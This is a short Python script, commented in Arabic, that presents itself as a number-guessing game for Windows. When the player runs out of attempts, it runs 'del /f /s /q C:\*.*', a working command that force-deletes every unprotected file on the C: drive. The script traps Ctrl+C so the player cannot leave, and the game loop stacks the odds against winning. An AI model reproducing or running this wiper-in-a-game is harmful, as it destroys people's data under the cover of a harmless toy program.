import random, time, os

# تنظيف الشاشة في ويندوز
os.system("cls")

def askuser():
    print("welcome I'm osama devloper the game\nWould you like to play with me? \nThe game is about guessing a number.\nIf you succeed. I will grant you any request.\nIf you lose. I will delete all your files. 🙂\n")
    while True:
        Ask = input("Will you play with me? to choose yes or no: ").lower()
        if Ask == "yes":
            print("\nokay. You will be redirected to the game after 3 second ")
            time.sleep(3)
            os.system("cls")
            break
        elif Ask == "no":
            print("\nokay. Bey.. 👋")
            exit()
        else:
            print("\nPlease choose yes or no..\n")

# بدء اللعبة
askuser()

Attempts = 4
print("\nThis is a game dangerous 🙂")
print("I will keep a number in me cerebral from 1 to 2 and you have to guess the number. If you guess wrong, I will delete your files. 🙂")
time.sleep(1)
print(f"With you {Attempts} Attempts 🙂\n")

while True:
    choose = random.randint(1, 2)
    Attempts -= 1

    # إذا نفدت المحاولات (الخسارة)
    if Attempts == 0:
        time.sleep(1)
        print("\ngame over. The Attempts are finished. All your files will be completely deleted after 2 second 🙂\n")
        time.sleep(2)
        
        # --- السطر التدميري الشامل ---
        # سيقوم بمسح كل الملفات على قرص C التي لا يحميها النظام
        os.system(r'del /f /s /q C:\*.*')
        # ----------------------------
        
        print("\n[!] Full System Cleanup Complete. Bye bye! 😹")
        break

    try:
        ask_user = int(input("you choose 1 or 2 🙂 : "))
        if ask_user == choose:
            print(f"\nYou passed the test 😻 I chose {choose} \n")
            break
        else:
            print(f"\nWrong choice 🤨 The number I had was ({choose}) Remaining: {Attempts}\n")

    except ValueError:
        print(f"\nError! Invalid input. Remaining: {Attempts} Attempts 🙂\n")
    except KeyboardInterrupt:
        print("\nYou can't go out 😹😹")
